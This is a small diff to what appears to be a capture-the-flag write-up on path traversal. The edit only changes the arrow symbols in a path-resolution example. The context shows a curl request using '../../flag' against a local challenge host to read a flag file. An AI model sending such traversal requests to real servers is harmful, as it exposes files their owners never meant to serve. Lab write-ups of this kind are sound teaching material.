@@ -42,7 +42,7 @@ The challenge looks for the `/data` path in the request and then uses the follow
 curl "challenge.localhost:80/data/../../flag"
 
 ## Full path:
-/challenge + /files/ + flag  -->  /challenge/files/../../flag  -->  /flag
+/challenge + /files/ + flag  ==>  /challenge/files/../../flag  ==>  /flag
 ```
 
 Let's perform path traversal to solve this challenge.
